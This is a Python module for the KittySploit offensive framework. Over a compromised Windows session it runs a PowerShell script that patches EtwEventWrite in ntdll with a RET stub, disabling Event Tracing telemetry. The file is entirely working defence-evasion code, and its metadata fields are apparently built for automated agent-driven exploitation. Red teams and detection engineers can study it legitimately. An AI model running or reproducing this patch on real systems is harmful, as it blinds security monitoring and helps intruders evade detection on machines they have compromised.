#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin

_ETW_PATCH_PS = r"""
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
}
"@
$nt = [EtwPatch]::GetModuleHandle("ntdll.dll")
$etw = [EtwPatch]::GetProcAddress($nt, "EtwEventWrite")
$old = 0
[EtwPatch]::VirtualProtect($etw, [UIntPtr]::new(1), 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($etw, 0xC3)
Write-Output "ETW_PATCHED"
"""


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows ETW Patch",
        "description": (
            "Patch EtwEventWrite in ntdll (RET stub) inside the current "
            "PowerShell process to reduce script telemetry."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1562/006/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.7,
            "value": 1.1,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        print_warning("ETW patch affects only the current PowerShell process lifetime.")
        out = self.win_run_powershell(_ETW_PATCH_PS, timeout=15)
        if "ETW_PATCHED" in out:
            print_success("EtwEventWrite patched in current PowerShell process.")
            return True
        print_warning("ETW patch did not confirm success.")
        print_debug(out)
        return False
